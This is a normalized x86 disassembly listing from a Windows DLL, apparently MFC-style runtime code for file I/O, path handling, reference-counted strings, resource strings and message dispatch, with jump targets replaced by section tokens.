push [ ecx + 0x4 ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
call [ GetLastError@IAT ]
push eax
call sub_100151a4
pop ebp
retn 0x8
sub_100145a5
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
lea eax [ ebp + 0xc ]
push 0x0
push eax
push edi
push [ ebp + 0x8 ]
push [ esi + 0x4 ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
push [ esi + 0xc ]
call [ GetLastError@IAT ]
push eax
call sub_100151a4
push [ esi + 0xc ]
push 0xffffffff
push 0xd
call sub_10015265
sub_100145f0
push esi
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ SetFilePointer@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax esi
pop esi
retn 0x8
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_100151a4
sub_1001461f
push esi
push 0x1
push 0x0
push 0x0
push [ ecx + 0x4 ]
call [ SetFilePointer@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax esi
pop esi
retn
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_100151a4
sub_10014669
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
or [ esi + 0x4 ] 0xffffffff
and [ esi + 0x8 ] 0x0
lea ecx [ esi + 0xc ]
call sub_10014b7c
test edi edi
pop edi
pop esi
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov edi eax
neg edi
sbb edi edi
inc edi
retn
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_100151a4
sub_100146ca
push 0x0
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ LockFile@IAT ]
test eax eax
jne r-xdata
retn 0x8
push eax
call [ GetLastError@IAT ]
push eax
call sub_100151a4
sub_100146f3
push 0x0
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ UnlockFile@IAT ]
test eax eax
jne r-xdata
retn 0x8
push eax
call [ GetLastError@IAT ]
push eax
call sub_100151a4
sub_1001471c
push esi
mov esi ecx
push 0x0
mov eax [ esi ]
push [ esp + 0xc ]
call [ eax + 0x28 ]
push [ esi + 0x4 ]
call [ SetEndOfFile@IAT ]
test eax eax
pop esi
jne r-xdata
retn 0x4
push eax
call [ GetLastError@IAT ]
push eax
call sub_100151a4
sub_10014748
push ebx
push esi
mov esi ecx
push edi
push 0x1
push 0x0
mov eax [ esi ]
call [ eax + 0x28 ]
mov edi eax
mov eax [ esi ]
push 0x2
push 0x0
mov ecx esi
call [ eax + 0x28 ]
mov ebx eax
mov eax [ esi ]
push 0x0
push edi
mov ecx esi
call [ eax + 0x28 ]
pop edi
mov eax ebx
pop esi
pop ebx
retn
sub_1001477a
mov eax sub_1001a42c
call sub_10008d90
sub esp 0x14c
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
mov esi 0x104
push edi
push esi
push [ ebp + 0xc ]
call [ GetFullPathNameA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
xor esi esi
push eax
push edi
mov [ ebp - 0x4 ] esi
call sub_1001484a
push esi
lea eax [ ebp - 0x10 ]
push esi
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push esi
push esi
push [ ebp + 0x8 ]
call [ GetVolumeInformationA@IAT ]
test eax eax
je r-xdata
push esi
push [ ebp + 0xc ]
push edi
call [ lstrcpynA@IAT ]
xor eax eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_10014bf1
mov eax esi
test [ ebp - 0x10 ] 0x2
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
test [ ebp - 0x10 ] 0x4
jne r-xdata
push edi
call [ CharUpperA@IAT ]
push 0x1
pop esi
lea eax [ ebp - 0x158 ]
push eax
push [ ebp + 0xc ]
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
push eax
call [ FindClose@IAT ]
lea eax [ ebp - 0x12c ]
push eax
push [ ebp - 0x14 ]
call [ lstrcpyA@IAT ]
sub_1001484a
mov ecx [ esp + 0x8 ]
push ebx
push esi
mov esi 0x104
push edi
push esi
call sub_10014d8b
xor ebx ebx
mov edi eax
push esi
push ebx
push edi
call sub_10009030
add esp 0xc
push esi
push [ esp + 0x14 ]
push edi
call [ lstrcpynA@IAT ]
mov cl [ edi ]
mov eax edi
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
mov cl [ edi ]
mov eax edi
inc eax
inc eax
mov cl [ eax + 0x1 ]
cmp cl 0x5c
je r-xdata
cmp cl 0x2f
jne r-xdata
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
cmp cl 0x2f
je r-xdata
push eax
call sub_1000900d
pop ecx
mov cl [ eax ]
jmp r-xdata
mov ecx [ esp + 0x14 ]
push 0xffffffff
call sub_10014dda
pop edi
pop esi
pop ebx
retn 0x8
mov [ eax + 0x1 ] bl
cmp cl 0x2f
je r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
push eax
call sub_1000900d
pop ecx
cmp cl 0x2f
je r-xdata
cmp cl bl
je r-xdata
push eax
call sub_1000900d
pop ecx
mov cl [ eax ]
jmp r-xdata
cmp cl 0x5c
je r-xdata
push eax
call sub_1000900d
pop ecx
jmp r-xdata
cmp cl bl
je r-xdata
cmp cl 0x2f
jne r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
sub_10014910
push ebp
mov ebp esp
sub esp 0x104
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
mov esi edi
jne r-xdata
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call GetFileTitleA
test ax ax
je r-xdata
lea esi [ ebp - 0x104 ]
mov [ ebp + 0x10 ] 0x104
test edi edi
jne r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_10019035
jmp r-xdata
xor eax eax
push esi
call [ lstrlenA@IAT ]
inc eax
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
sub_10014966
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
mov eax [ ecx ]
cmp [ eax - 0xc ] 0x0
jl r-xdata
mov eax [ rw-data ]
mov [ esi ] eax
push [ ecx ]
mov ecx esi
call sub_10014c9a
mov [ esi ] eax
add eax 0xfffffff4
push eax
call [ InterlockedIncrement@IAT ]
jmp r-xdata
mov eax esi
pop esi
retn 0x4
sub_10014a5e
push ebx
push esi
mov esi [ esp + 0xc ]
mov ebx ecx
test esi esi
jne r-xdata
push edi
push 0x40
pop edi
cmp esi edi
jg r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
jmp r-xdata
mov edi 0x80
cmp esi edi
jg r-xdata
mov ecx rw-data
pop esi
pop ebx
retn 0x4
mov edi 0x100
cmp esi edi
jg r-xdata
mov ecx rw-data
jmp r-xdata
mov [ eax ] 0x1
and [ eax + esi + 0xc ] 0x0
mov [ eax + 0x4 ] esi
add eax 0xc
mov [ ebx ] eax
pop edi
mov edi 0x200
cmp esi edi
jg r-xdata
mov ecx rw-data
jmp r-xdata
call sub_10006c1b
mov [ eax + 0x8 ] edi
jmp r-xdata
lea eax [ esi + 0xd ]
push eax
call sub_10014308
pop ecx
mov [ eax + 0x8 ] esi
mov ecx rw-data
jmp r-xdata
sub_10014ae0
mov eax [ ecx + 0x8 ]
cmp eax 0x40
jne r-xdata
cmp eax 0x80
jne r-xdata
push ecx
mov ecx rw-data
cmp eax 0x100
jne r-xdata
push ecx
mov ecx rw-data
jmp r-xdata
cmp eax 0x200
push ecx
jne r-xdata
push ecx
mov ecx rw-data
jmp r-xdata
call sub_10006caa
retn
call sub_10014331
pop ecx
retn
mov ecx rw-data
jmp r-xdata
sub_10014b28
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ eax - 0xc ]
cmp ecx [ rw-data ]
je r-xdata
pop esi
retn
add eax 0xfffffff4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax [ rw-data ]
mov [ esi ] eax
mov ecx [ esi ]
sub ecx 0xc
call sub_10014ae0
sub_10014b9a
push esi
push edi
mov edi ecx
mov esi [ edi ]
cmp [ esi - 0xc ] 0x1
jle r-xdata
pop edi
pop esi
retn
call sub_10014b28
push [ esi - 0x8 ]
mov ecx edi
call sub_10014a5e
mov eax [ esi - 0x8 ]
inc eax
push eax
push esi
push [ edi ]
call sub_1000a190
add esp 0xc
sub_10014bc8
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
jg r-xdata
mov ecx esi
call sub_10014b28
push edi
mov ecx esi
call sub_10014a5e
cmp edi [ eax - 0x4 ]
jle r-xdata
pop edi
pop esi
retn 0x4
sub_10014bf1
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ eax - 0xc ]
cmp ecx [ rw-data ]
je r-xdata
pop esi
retn
add eax 0xfffffff4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
sub ecx 0xc
call sub_10014ae0
sub_10014c1b
mov eax [ rw-data ]
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
test ebx ebx
mov [ esi ] eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn 0x4
mov eax ebx
shr eax 0x10
test ax ax
jne r-xdata
push ebx
call [ lstrlenA@IAT ]
mov edi eax
test edi edi
je r-xdata
movzx eax bx
push eax
call sub_1001554e
jmp r-xdata
push edi
mov ecx esi
call sub_10014a5e
push edi
push ebx
push [ esi ]
call sub_1000a190
add esp 0xc
sub_10014c6d
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_10014bc8
push edi
push [ esp + 0x14 ]
push [ esi ]
call sub_1000a190
mov eax [ esi ]
add esp 0xc
mov [ eax - 0x8 ] edi
mov eax [ esi ]
and [ eax + edi ] 0x0
pop edi
pop esi
retn 0x8
sub_10014c9a
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
jne r-xdata
push edi
call [ lstrlenA@IAT ]
xor eax eax
jmp r-xdata
push edi
push eax
mov ecx esi
call sub_10014c6d
mov eax esi
pop edi
pop esi
retn 0x4
sub_10014cc1
push ebx
mov ebx [ esp + 0x10 ]
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi ecx
lea eax [ edi + ebx ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn 0x10
push eax
call sub_10014a5e
push edi
push [ esp + 0x18 ]
push [ esi ]
call sub_1000a190
mov eax [ esi ]
push ebx
push [ esp + 0x2c ]
add eax edi
push eax
call sub_1000a190
add esp 0x18
sub_10014cff
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
mov esi ecx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
lea ebx [ eax - 0xc ]
jg r-xdata
push [ esp + 0x14 ]
mov ecx esi
push edi
push eax
push [ eax - 0x8 ]
call sub_10014cc1
push ebx
call sub_10014b59
mov ecx [ eax - 0x8 ]
lea edx [ ecx + edi ]
cmp edx [ eax - 0x4 ]
jg r-xdata
push edi
add ecx eax
push [ esp + 0x18 ]
push ecx
call sub_1000a190
mov eax [ esi ]
add esp 0xc
add [ eax - 0x8 ] edi
mov eax [ esi ]
mov ecx [ eax - 0x8 ]
and [ ecx + eax ] 0x0
jmp r-xdata
sub_10014d8b
push ebx
push esi
mov esi ecx
mov ecx [ esp + 0xc ]
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
lea ebx [ eax - 0xc ]
jg r-xdata
push edi
mov edi [ eax - 0x8 ]
cmp ecx edi
jge r-xdata
cmp ecx [ eax - 0x4 ]
jle r-xdata
push ecx
mov ecx esi
call sub_10014a5e
lea eax [ edi + 0x1 ]
push eax
lea eax [ ebx + 0xc ]
push eax
push [ esi ]
call sub_1000a190
mov eax [ esi ]
add esp 0xc
push ebx
mov [ eax - 0x8 ] edi
call sub_10014b59
pop edi
mov ecx edi
mov eax [ esi ]
pop esi
pop ebx
retn 0x4
sub_10014dda
push esi
mov esi ecx
call sub_10014b9a
mov eax [ esp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov [ ecx - 0x8 ] eax
mov ecx [ esi ]
pop esi
and [ ecx + eax ] 0x0
retn 0x4
push [ esi ]
call [ lstrlenA@IAT ]
sub_10014e02
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_10014d8b
mov eax [ esi ]
mov [ eax - 0x8 ] edi
mov eax [ esi ]
and [ eax + edi ] 0x0
mov eax [ esi ]
pop edi
pop esi
retn 0x4
sub_10014e22
mov eax sub_1001a46b
call sub_10008d90
sub esp 0x120
and [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x12c ]
push esi
push eax
call sub_10014f55
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push 0x1
mov eax 0x100
pop esi
lea ecx [ ebp - 0x10 ]
push eax
push eax
mov [ ebp - 0x4 ] esi
call sub_10014d8b
push eax
lea eax [ ebp - 0x11a ]
push eax
call sub_10019035
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_10014dda
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10014966
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_10014bf1
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_10014ea4
mov eax sub_1001a497
call sub_10008d90
sub esp 0x120
and [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x12c ]
push esi
push eax
call sub_10014f55
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push 0x1
mov eax 0x100
pop esi
lea ecx [ ebp - 0x10 ]
push eax
push eax
mov [ ebp - 0x4 ] esi
call sub_10014d8b
push eax
lea eax [ ebp - 0x11a ]
push eax
call sub_10014910
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_10014dda
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10014966
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_10014bf1
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_10014f26
push ebp
mov ebp esp
sub esp 0x11c
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x11c ]
push eax
call sub_10014f55
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10a ]
push eax
call sub_10014c1b
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10014f55
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x118
push 0x0
mov edi ecx
push esi
call sub_10009030
add esp 0xc
lea eax [ esi + 0x12 ]
push 0x104
push [ edi + 0xc ]
push eax
call [ lstrcpynA@IAT ]
mov eax [ edi + 0x4 ]
or ebx 0xffffffff
cmp eax ebx
je r-xdata
push 0x1
pop eax
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
push eax
call [ GetFileTime@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
push [ edi + 0x4 ]
call [ GetFileSize@IAT ]
cmp eax ebx
mov [ esi + 0xc ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov edi [ edi + 0xc ]
cmp [ edi - 0x8 ] 0x0
jne r-xdata
push edi
call [ GetFileAttributesA@IAT ]
cmp eax ebx
je r-xdata
and [ esi + 0x10 ] 0x0
jmp r-xdata
mov [ esi + 0x10 ] al
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea ecx [ ebp + 0x8 ]
call sub_10013e8e
mov eax [ eax ]
push ebx
mov [ esi ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_10013e8e
mov eax [ eax ]
push ebx
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_10013e8e
mov eax [ eax ]
mov [ esi + 0x4 ] eax
cmp [ esi ] 0x0
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] eax
sub_1001502f
push ebp
mov ebp esp
sub esp 0x140
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
lea edi [ esi + 0x12 ]
push edi
call sub_1001477a
test eax eax
jne r-xdata
lea eax [ ebp - 0x140 ]
push eax
push [ ebp + 0x8 ]
call [ FindFirstFileA@IAT ]
or edi 0xffffffff
cmp eax edi
jne r-xdata
and [ edi ] al
jmp r-xdata
push eax
call [ FindClose@IAT ]
mov al [ ebp - 0x140 ]
push edi
and al 0x7f
lea ecx [ ebp + 0x8 ]
mov [ esi + 0x10 ] al
mov eax [ ebp - 0x120 ]
mov [ esi + 0xc ] eax
lea eax [ ebp - 0x13c ]
push eax
call sub_10013e8e
mov eax [ eax ]
push edi
mov [ esi ] eax
lea eax [ ebp - 0x134 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_10013e8e
mov eax [ eax ]
push edi
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x12c ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_10013e8e
mov eax [ eax ]
mov [ esi + 0x4 ] eax
cmp [ esi ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
pop edi
pop esi
leave
retn 0x8
push 0x1
pop eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] eax
sub_10015109
push ebp
mov ebp esp
sub esp 0x204
mov eax [ ecx ]
lea edx [ ebp - 0x4 ]
push edx
lea edx [ ebp - 0x204 ]
push 0x200
push edx
call [ eax + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x204 ]
push [ ebp + 0x8 ]
push eax
call sub_10018ce6
jmp r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_10018d1e
mov [ ebp + 0xc ] 0xf020
leave
retn 0x8
sub_1001515e
mov eax sub_1001a4b8
call sub_10008d90
sub esp 0xc
push ebx
push esi
xor eax eax
push edi
cmp [ ecx + 0xc ] eax
mov [ ebp - 0x10 ] esp
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] eax
call [ ecx + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
sub_100151c5
mov eax sub_1001a4d4
call sub_10008d90
push ecx
mov eax [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
test eax eax
mov edi 0xf1a0
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x10 ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_10014966
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
add ecx edi
mov [ eax ] ecx
mov eax [ esi + 0x8 ]
push [ ebp + 0x10 ]
add eax edi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10018f58
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call [ lstrcpynA@IAT ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0x10 ]
call sub_10014bf1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_10014bf1
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
push 0xf006
lea ecx [ ebp + 0x10 ]
call sub_1001554e
sub_10015265
mov eax sub_1001a4fc
call sub_10008d90
push ecx
push ecx
push esi
push 0x14
call sub_10014308
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov ecx esi
call sub_100150e1
mov eax [ rw-data ]
lea ecx [ esi + 0x10 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0xc ] eax
call sub_10014c9a
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x10 ]
push r--data
push eax
mov [ ebp - 0x10 ] esi
call sub_1000870c
pop esi
sub_100152d0
mov eax [ esp + 0x4 ]
mov ecx 0x10b
cmp eax ecx
ja r-xdata
sub eax 0x3e3
je r-xdata
je r-xdata
push 0xa
dec eax
je r-xdata
push 0x3
jmp r-xdata
cmp eax 0x3e
ja r-xdata
dec eax
je r-xdata
pop eax
cmp eax 0x6b
ja r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
mov ecx 0x90
cmp eax ecx
ja r-xdata
je r-xdata
push 0x8
jmp r-xdata
cmp eax 0x19
ja r-xdata
push 0x5
jmp r-xdata
push 0x1
jmp r-xdata
mov ecx 0xb6
cmp eax ecx
ja r-xdata
je r-xdata
push 0x2
jmp r-xdata
cmp eax 0x47
ja r-xdata
cmp eax 0x27
ja r-xdata
je r-xdata
sub eax 0xb7
je r-xdata
je r-xdata
cmp eax 0x75
ja r-xdata
sub eax 0x50
je r-xdata
je r-xdata
add eax 0xffffffcc
cmp eax 0x8
ja r-xdata
je r-xdata
push 0x9
jmp r-xdata
cmp eax 0x18
ja r-xdata
sub eax 0x8
je r-xdata
push 0x6
jmp r-xdata
sub eax 0x91
je r-xdata
sub eax 0x7b
je r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
sub eax 0x40
je r-xdata
jmp [ eax * 4 + jump_table_1001552a ]
push 0xd
jmp r-xdata
cmp eax 0x20
ja r-xdata
jmp [ eax * 4 + jump_table_100154c6 ]
dec eax
dec eax
je r-xdata
push 0x7
jmp r-xdata
sub eax 0x9
je r-xdata
dec eax
je r-xdata
sub eax 0x6c
je r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
sub eax 0x21
je r-xdata
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
jmp r-xdata
sub eax 0xd
je r-xdata
sub eax 0x7
je r-xdata
dec eax
je r-xdata
push 0xc
jmp r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
push 0xb
jmp r-xdata
sub eax 0x1a
je r-xdata
retn 0x4
dec eax
dec eax
jne r-xdata
sub eax 0x6
je r-xdata
sub eax 0x6
je r-xdata
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
dec eax
je r-xdata
dec eax
dec eax
je r-xdata
dec eax
je r-xdata
jmp r-xdata
sub eax 0x3
jne r-xdata
jmp r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
dec eax
dec eax
je r-xdata
jmp r-xdata
dec eax
jne r-xdata
dec eax
jne r-xdata
jmp r-xdata
push 0xe
jmp r-xdata
sub_1001554e
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi 0x100
push edi
lea eax [ ebp - 0x104 ]
push esi
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
call sub_100155d2
mov edi eax
mov eax esi
sub eax edi
cmp eax 0x2
jbe r-xdata
push ebx
mov edi esi
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_10014c9a
xor eax eax
test edi edi
setg al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add edi esi
push edi
lea eax [ edi - 0x1 ]
push eax
call sub_10014d8b
push eax
push [ ebp + 0x8 ]
call sub_100155d2
mov ebx eax
mov eax edi
sub eax ebx
cmp eax 0x2
jle r-xdata
mov ecx [ ebp - 0x4 ]
push 0xffffffff
call sub_10014dda
xor eax eax
test ebx ebx
setg al
pop ebx
pop edi
pop esi
leave
retn 0x4
sub_100155d2
push esi
call sub_10019774
push [ esp + 0x10 ]
mov esi [ esp + 0x10 ]
mov eax [ eax + 0xc ]
push esi
push [ esp + 0x10 ]
push eax
call [ LoadStringA@IAT ]
test eax eax
jne r-xdata
pop esi
retn 0xc
and [ esi ] al
sub_10015628
mov eax sub_1001a598
call sub_10008d90
push ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ecx + 0x10 ]
and [ ebp - 0x4 ] 0x0
add ecx 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call [ eax + 0x1c ]
sub_10015653
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push ebx
push esi
push 0x1
test eax eax
pop ebx
je r-xdata
mov eax [ ebp + 0x1c ]
cmp eax 0x28
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub eax 0x29
je r-xdata
je r-xdata
mov eax ebx
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
sub eax 0x3
je r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
dec eax
je r-xdata
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0xc ]
jmp r-xdata
sub eax 0xa
je r-xdata
xor ebx ebx
cmp [ esi + 0x1c ] ebx
sete bl
and [ esi + 0x1c ] 0x0
jmp r-xdata
push [ ebp + 0xc ]
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
dec eax
je r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x18 ]
dec eax
je r-xdata
mov ebx eax
push [ ebp + 0xc ]
jmp r-xdata
sub eax 0x16
je r-xdata
push [ ebp + 0x18 ]
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub eax 0x3
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x1c
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub_1001575a
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
cmp eax 0xfffffffe
mov edi ecx
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
call sub_10019774
push [ ebp + 0x14 ]
mov eax [ eax + 0x1038 ]
mov ecx eax
push [ ebp + 0x10 ]
mov edx [ eax ]
push [ ebp + 0x8 ]
push edi
call [ edx + 0x4 ]
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebp + 0x10 ]
and [ ebp + 0xc ] 0x0
mov ecx edi
mov eax [ ebx + 0x30 ]
mov [ ebp + 0x10 ] eax
mov eax [ edi ]
call [ eax + 0x2c ]
mov edi eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov ebx 0x111
mov ebx eax
movzx eax ax
shr ebx 0x10
mov [ ebp + 0xc ] eax
jne r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
xor eax eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push ebx
push [ esi + 0x4 ]
call sub_10016c44
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov esi eax
mov esi [ edi + 0x4 ]
push [ ebp + 0x14 ]
push [ eax + 0x10 ]
push [ ebp + 0x10 ]
push [ eax + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
call sub_10015653
jmp r-xdata
mov esi [ esi ]
jmp r-xdata
mov edi [ edi ]
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
test esi esi
